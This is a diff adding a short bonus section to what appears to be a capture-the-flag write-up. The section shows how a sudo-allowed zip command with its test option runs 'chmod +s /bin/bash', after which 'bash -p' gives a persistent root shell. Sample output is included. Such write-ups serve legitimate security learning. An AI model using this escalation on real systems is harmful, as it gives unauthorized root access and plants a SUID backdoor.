@@ -254,3 +254,19 @@ sudo rm $TF
 
 12. We can then go to ```cd /root``` and ```cat``` the root flag.
 
+## Bonus: Gaining a More Stable Root Shell
+
+13. Lets edit the GTFObin script a little:
+```bash
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'chmod +s /bin/bash'
+```
+
+- Now if you run ```ls -l /bin/bash``` you will see we have root access:
+```bash
+merlin@ubuntu:~$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
+```
+
+- Just run ```bash -p``` and now we are ```root``` even though ```id``` still see us as ```merlin```.
+
